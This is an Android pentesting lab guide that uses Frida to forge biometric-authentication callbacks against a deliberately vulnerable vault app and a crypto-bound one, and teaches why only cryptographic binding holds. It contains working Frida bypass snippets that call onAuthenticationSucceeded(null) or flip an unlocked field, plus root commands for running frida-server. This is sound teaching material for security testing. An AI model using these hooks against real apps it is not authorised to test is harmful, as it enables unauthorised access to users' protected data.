# Lab 01 — Callback versus crypto: the same attack, twice

> **Objective:** run one unchanged Frida script against two apps that look identical to the user,
> and watch it defeat the first and be defeated by the second. By the end you will be able to state,
> in one sentence and with evidence, why a biometric prompt with no `CryptoObject` is not
> authentication.

| | |
|---|---|
| **Difficulty** | Beginner to intermediate |
| **Time** | 60–90 minutes (30 if you skip the build and use a real app) |
| **Needs** | A device or emulator with **frida-server**; a fingerprint enrolled; Android Studio *or* a JDK plus Android SDK build-tools |
| **Chapter sections** | [§3.4](../README.md), [§5.3 V1](../README.md), [§7.1–7.7](../README.md) |
| **Files** | [`../examples/01-CallbackOnlyVault.java`](../examples/01-CallbackOnlyVault.java), [`../examples/02-CryptoBoundVault.java`](../examples/02-CryptoBoundVault.java), [`../scripts/hook-biometric-prompt.js`](../scripts/hook-biometric-prompt.js) |

> `01-CallbackOnlyVault.java` is deliberately vulnerable. Build and install it **only on a device
> or emulator you own**. It contacts no network and handles no data but a hard-coded string. Do not
> lift it into anything real. See [SECURITY.md](../../SECURITY.md) for authorised-testing scope.

---

## 0. What you are about to prove, and why it is not obvious

Two apps. Same screen, same button, same fingerprint dialog, same "your secret is safe" copy. To a
user, and to a screenshot in a security review, they are the same app.

One of them can be opened by a three-line Frida snippet that presents no finger at all. The other
cannot — and crucially, **the attack does not change**. You will run the identical script against
both. What differs is entirely on the defender's side, and it is about eight lines of code.

The reason this is worth doing by hand rather than reading is that the *failure* mode is
counter-intuitive. When you attack the second app, the forged callback **succeeds**. Frida reports
no error. The method returns. If you stopped there you would write "bypass confirmed" in your
report. Only when you look at what happened *after* the callback do you see
`UserNotAuthenticatedException`, and realise you unlocked a screen and nothing else.

That gap — between "the callback returned" and "the data was reachable" — is the entire lab.

---

## 1. Setup

### 1.1 Confirm your device

```bash
# host
adb devices -l
adb shell getprop ro.product.model
adb shell getprop ro.build.version.sdk
adb shell 'pm list features | grep -i fingerprint'
adb shell dumpsys fingerprint
```

You need `feature:android.hardware.fingerprint` and at least one enrolled print. `dumpsys
fingerprint` shows `"count":N` — if `N` is 0, enrol a fingerprint in Settings before continuing,
because **a per-use auth-bound key cannot even be created with nothing enrolled** (see
[lab 02](lab-02-auth-bound-keys.md) for that measurement).

On an emulator, enrol through Settings and use `adb emu finger touch 1` to present the finger.

### 1.2 Confirm frida

```bash
# host
frida --version
adb shell 'ps -A -o NAME | grep frida'      # expect frida-server
frida-ps -U | head
```

If `frida-ps -U` lists processes, you are ready. If frida-server is not running, start it as root:

```bash
# host
adb shell 'su -c "/data/local/tmp/frida-server &"'
```

> **Pentester's Note**
> Record which device you are on and whether it is rooted, in your notes, before you measure
> anything. The chapter was written across two devices that disagree about `dumpsys biometric`,
> about whether the shell holds `USE_BIOMETRIC`, and about whether the keystore is a real TEE. A
> measurement without a device attached to it is not a measurement.

### 1.3 Record the baseline counters

This is the zero-tooling half of the lab and it takes ten seconds. Do it now.

```bash
# adb shell
dumpsys fingerprint
```

Write down `accept` and `acceptCrypto`. You will read them again at the end of each attack, and the
pair will tell you which app you were talking to without any instrumentation at all.

---

## 2. Build the two apps

If you would rather not build anything, skip to §2.4 — the lab works against any app with a
biometric prompt, you just lose the controlled comparison.

### 2.1 Project skeleton

Create a standard Android Studio project (Empty Views Activity, minSdk 23, package
`com.pentest.ch48.vulnerable`) and replace the generated activity with
[`../examples/01-CallbackOnlyVault.java`](../examples/01-CallbackOnlyVault.java). Then repeat for
`com.pentest.ch48.secure` with
[`../examples/02-CryptoBoundVault.java`](../examples/02-CryptoBoundVault.java).

The paths below are **inside the Android project you create**, not inside this repository:

```kotlin
// app/build.gradle.kts   (in the project you create)
plugins {
    id("com.android.application")
}

android {
    namespace = "com.pentest.ch48.vulnerable"     // or .secure for the second app
    compileSdk = 34

    defaultConfig {
        applicationId = "com.pentest.ch48.vulnerable"
        minSdk = 23
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }

    buildTypes {
        // Build BOTH a debug and a release variant. The release one is the interesting one:
        // R8 will rename your classes and leave androidx.biometric alone, which is section 6.1's
        // claim and you should see it for yourself.
        release {
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"))
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("androidx.biometric:biometric:1.1.0")
}
```

```xml
<!-- app/src/main/AndroidManifest.xml   (in the project you create) -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.USE_BIOMETRIC" />

    <application
        android:allowBackup="false"
        android:label="ch48 vulnerable"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
        <activity
            android:name=".CallbackOnlyVault"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

`android:allowBackup="false"` is deliberate: with backup enabled, `adb backup` is an entirely
separate route to the `SharedPreferences` and it would muddy the result you are trying to isolate.

### 2.2 Install

```bash
# host
./gradlew :app:assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

**If the install is refused with `INSTALL_FAILED_USER_RESTRICTED`,** you are on a MIUI device with
"Install via USB" restricted. It is an OEM policy rather than a fault in your APK, and the
accompanying "Install canceled by user" is untrue — nobody cancelled anything. Neither
`settings put global verifier_verify_adb_installs 0` nor `pm install -i com.android.shell` changes
it. Root is not subject to the gate:

```bash
# host
adb push app-debug.apk /data/local/tmp/app.apk
adb shell "su -c 'pm install -r /data/local/tmp/app.apk'"
adb shell rm -f /data/local/tmp/app.apk          # clean up after yourself
```

Neither `settings put global verifier_verify_adb_installs 0` nor `pm install -i com.android.shell`
helps; the gate is the OEM's policy and root is not subject to it.

### 2.3 Sanity check

Launch each app by hand. Both should show a fingerprint dialog. The vulnerable one reveals
`CH48{callback_only_is_not_authentication}` after a successful scan; the secure one seals a secret
on first run and reveals `CH48{crypto_binding_is_authentication}` on later runs.

**If the secure app never shows a prompt on first run**, read the logcat: it may have hit the
"at least one biometric must be enrolled" refusal. Enrol a finger and clear the app's data.

### 2.4 No-build alternative

Any app on your device with a biometric unlock will do for passes 1 and 3. You lose the controlled
comparison but keep the important lesson, because most apps you pick will be callback-only and the
script will tell you so in one line.

---

## 3. Pass 1 — Observe. Change nothing.

```bash
# host
frida -U -f com.pentest.ch48.vulnerable -l ../scripts/hook-biometric-prompt.js
```

Let the app start. Watch the hook installation lines, then trigger the prompt.

**Expected against the vulnerable app:**

```
[..] hooked androidx.biometric.BiometricPrompt.authenticate x2
[..] hooked androidx AuthenticationCallback.onAuthenticationSucceeded
[..] hooked KeyGenParameterSpec.Builder
[..] hooked javax.crypto.Cipher.init x4
[..] ready. Interact with the app, then call report().

[..] canAuthenticate[androidx](BIOMETRIC_WEAK (0xff)) -> 0 (SUCCESS)
[..] PROMPT  androidx.biometric.BiometricPrompt.authenticate(1 args)  NO CryptoObject
[..]         -> the result of this prompt is a boolean in this process. Try forge().
```

**Expected against the secure app:**

```
[..] KEYSPEC ch48_vault_key  PER-USE - requires a CryptoObject and a fresh HAT. This is the strong form.
[..] CRYPTO  Cipher.init(AES/GCM/NoPadding) THREW  UserNotAuthenticatedException - HARDWARE REFUSED
[..]         -> if you forged a callback, this is where it stopped mattering.
[..] canAuthenticate[androidx](BIOMETRIC_STRONG (0xf)) -> 0 (SUCCESS)
[..] PROMPT  androidx.biometric.BiometricPrompt.authenticate(2 args)  WITH CryptoObject  [Cipher=AES/GCM/NoPadding]
[..]         -> binding is at least attempted. Pass 3 decides whether it holds.
```

### 3.1 Checkpoint — three questions before you touch anything

Answer these in your notes. They are the whole of pass 1 and they need no exploitation.

1. How many arguments did each app pass to `authenticate()`?
2. Did a `KEYSPEC` line appear for each app? What did it say?
3. Did `Cipher.init` throw against either app *before* any prompt appeared?

If you can answer those three, you already know which app is which. **You have not attacked
anything yet, and you have a defensible finding.** That is worth internalising: pass 1 is where most
of the value is, and it is entirely passive.

---

## 4. Pass 2 — Forge

### 4.1 Against the vulnerable app

With the app showing its prompt, in the Frida REPL:

```
[1]-> forge()
```

**Expected:**

```
[..] FORGING onAuthenticationSucceeded on com.pentest.ch48.vulnerable.CallbackOnlyVault$1
      with a null CryptoObject
[..] forge() returned without throwing. Now check PASS 3 output:
[..]   - if a Cipher.init succeeded, the app was NOT protected.
[..]   - if nothing cryptographic happened, you have proved the gate is UI-only
[..]     but NOT that any protected data was reachable. Say so in the report.
```

Look at the device: the secret is on screen. No finger was presented.

**The manual version**, so you understand what the script did:

```javascript
// frida REPL
Java.perform(function () {
    Java.choose('com.pentest.ch48.vulnerable.CallbackOnlyVault$1', {
        onMatch: function (cb) { cb.onAuthenticationSucceeded(null); },
        onComplete: function () {}
    });
});
```

Three lines.`null` is accepted, because the vulnerable app never reads the result
parameter — which is itself the tell from §6.2.

**Even simpler**, and often the first thing to try: attack the field rather than the callback.

```javascript
// frida REPL
Java.perform(function () {
    Java.choose('com.pentest.ch48.vulnerable.CallbackOnlyVault', {
        onMatch: function (act) {
            act.unlocked.value = true;
            Java.scheduleOnMainThread(function () { act.revealSecret(); });
        },
        onComplete: function () {}
    });
});
```

There is no callback involved at all. The gate was a boolean and you wrote to it.

### 4.2 Against the secure app

Same script, same command:

```
[1]-> forge()
```

Now watch carefully. Three outcomes are possible and each teaches something different.

**Outcome A — `forge()` throws immediately.**

```
[..] forge() threw: TypeError: cannot read property 'getCipher' of null
[..] A throw here is evidence too. An app that crashes on a synthetic result is dereferencing
     something real - usually the CryptoObject. Retry forge(true).
```

The app read `result.getCryptoObject()` and got `null`. **This is the app being correct** — it takes
the cipher from the result, not from a field (§3.4 consequence 2). Move to outcome B.

**Outcome B — `forge(true)` and the operation runs but fails cryptographically.**

```
[1]-> forge(true)
[..] FORGING onAuthenticationSucceeded on ... with an UNAUTHORISED CryptoObject
[..] CRYPTO  Cipher.init(AES/GCM/NoPadding) OK  <- a real operation was authorised
```

followed, on the device, by the app reporting a failure. You supplied a valid `Cipher` over *your
own* AES key, so the operation ran and produced garbage; GCM's authentication tag then failed and
`doFinal` threw `AEADBadTagException`. **The cryptography defended the app after the control flow
had already been subverted.** This is the second, independent layer, and it is why AEAD matters
here (chapter 34).

**Outcome C — the forge returns cleanly and the app still shows nothing.** The callback ran, the app
tried to use the cipher, and the keystore refused:

```
[..] CRYPTO  Cipher.init(AES/GCM/NoPadding) THREW  UserNotAuthenticatedException - HARDWARE REFUSED
```

### 4.3 The moment that matters

Whichever outcome you got, run:

```
[1]-> report()
```

and read the verdict. Against the secure app it should read:

```
---- VERDICT ----
BINDING HELD. A callback was forged and the cryptographic operation was still
refused by the keystore. The prompt is not bypassable by this technique.
```

> **Mental Model**
> `forge()` *worked* against both apps. The method was found, it was called, it returned. Frida
> reported no failure. If your definition of "bypass" is "the callback fired", you just bypassed
> both. The difference only appears when you ask what happened next — which is why the third pass
> exists and why most published demonstrations are incomplete.

---

## 5. Pass 3 — Adjudicate

### 5.1 Read the counters again

```bash
# adb shell
dumpsys fingerprint
```

Compare `accept` and `acceptCrypto` with your §1.3 baseline.

| What moved | What it means |
|---|---|
| `accept` up, `acceptCrypto` unchanged | Every authentication was unbound. The app is callback-only |
| both up | Crypto-bound authentications occurred |
| neither moved, but the app unlocked | **You forged the callback and no real authentication happened at all** |

That last row is the cleanest possible evidence for a report: the app unlocked and the platform
recorded no authentication.

### 5.2 Prove the keystore is the thing refusing

Detach Frida entirely and try to use the secure app's key from outside, with the shell probe:

```bash
# host, from the chapter root
./scripts/probe-biometrics.sh
```

Note the `key.peruse.cipherInit` line. The probe creates its *own* keys, not the app's — you cannot
reach another app's keystore entries, and that is the sandbox working — but the behaviour of an
identically-configured key is the same, and it is the behaviour that refused your forged callback.

### 5.3 What you cannot claim

Write these down, because they are the difference between a report that survives review and one
that does not:

- You **cannot** claim you extracted the secure app's key. You did not; it never left the TEE.
- You **cannot** claim you decrypted the secure app's data. The keystore refused.
- You **can** claim the vulnerable app's gate is bypassable with code execution in the process.
- You **must** then say what that gate protected. In this app it is Base64 in `SharedPreferences`,
  readable by root without any of this — so the honest severity is **Informational to Low**, and the
  real finding is the storage, not the prompt.

That last point is uncomfortable and it is the most professionally valuable thing in this lab.

---

## 6. Bonus — what R8 did

Build the release variant and decompile it.

```bash
# host
./gradlew :app:assembleRelease
jadx -d /tmp/ch48-jadx app/build/outputs/apk/release/app-release-unsigned.apk
grep -rn "androidx.biometric" /tmp/ch48-jadx | head
grep -rn "authenticate(" /tmp/ch48-jadx | head
python3 -B ../scripts/grade-biometric-usage.py /tmp/ch48-jadx --show-evidence
```

**What to look for.** Your own classes are now `a`, `b`, `c`. `androidx.biometric.BiometricPrompt`
is still spelled out, because the library ships keep rules. That is §6.1's claim, verified by you on
your own build — and it is why static analysis of biometric code remains tractable in obfuscated
apps when so much else does not.

Compare the grader's verdict on the release APK with its verdict on
[`../examples/`](../examples/README.md). They should agree.

---

## 7. Success criteria

You have completed this lab when you can produce, from your own notes:

- [ ] The `PROMPT` line for each app, showing 1 argument versus 2.
- [ ] The `KEYSPEC` line for the secure app.
- [ ] A screenshot or log of the vulnerable app revealing its secret after `forge()`, with no finger
      presented.
- [ ] The `UserNotAuthenticatedException` line from the secure app.
- [ ] Before-and-after `accept` / `acceptCrypto` counters for both attacks.
- [ ] A written severity for the vulnerable app that mentions **what was behind the gate**, not just
      that the gate opened.
- [ ] A one-sentence answer to: *"forge() succeeded against both apps — why is only one of them a
      finding?"*

---

## 8. Hints

<details>
<summary>The script hooks nothing / no PROMPT line appears</summary>

The app may be using the platform `BiometricPrompt` rather than androidx, or a `FingerprintManager`
fallback. The script hooks all three; check the "classes not present in this app" line it prints at
startup. If none of them are present, the app is not using a biometric API you have found yet — try
`android hooking search classes biometric` in objection, or grep the DEX.
</details>

<details>
<summary>forge() says "no callback observed yet"</summary>

The script captures the callback instance when `onAuthenticationSucceeded` fires or when
`authenticate()` is called with the platform API. On the androidx path with a lambda-style callback,
trigger the prompt and let it *succeed once with a real finger* — that populates
`state.lastCallback` — then cancel and forge on the next attempt.

Alternatively use `Java.choose` on the callback class directly, as in §4.1.
</details>

<details>
<summary>The secure app's Cipher.init never throws</summary>

Three possibilities, in order of likelihood:

1. The key is time-bound and the window is open. Check the `KEYSPEC` line.
2. You are on an emulator with a software keystore, where enforcement may differ. Check
   `key.*.enforcedBySecureHardware` from `probe-biometrics.sh`.
3. The device unlocked recently and the key accepts device credential. Check
   `KeyInfo.getUserAuthenticationType()` — a value of `3` includes `AUTH_DEVICE_CREDENTIAL`.

All three are findings in their own right, not lab failures.
</details>

<details>
<summary>The vulnerable app unlocks before I even attack it</summary>

Good — you found MISTAKE 4 without trying. It fails open when `canAuthenticate` is not `SUCCESS`.
Check whether you have a fingerprint enrolled. This is the easiest finding in the chapter and it
needs no tooling at all.
</details>

---

## 9. Clean up

```bash
# host
adb uninstall com.pentest.ch48.vulnerable
adb uninstall com.pentest.ch48.secure
adb shell 'ls /data/local/tmp | grep -i ch48'      # expect nothing
```

Uninstalling removes the apps' keystore entries with their UIDs; you do not need to delete keys by
hand. If you ran `probe-biometrics.sh` with `--keep`, run it again without the flag to remove the
`ch48_probe_*` keys from the **shell** keystore namespace.

---

## 10. Where to go next

- [Lab 02 — Measuring the binding yourself](lab-02-auth-bound-keys.md) reproduces the time-bound
  measurement that shows why a technically-correct implementation can still fail.
- [Lab 03 — Audit a real app](lab-03-audit-a-real-app.md) applies this method to something you did
  not write.
- [49 — KeyStore lab 02](../../49-KeyStore/labs/lab-02-extraction-vs-use.md) is the key-side
  companion: extraction versus use, on the same hardware.
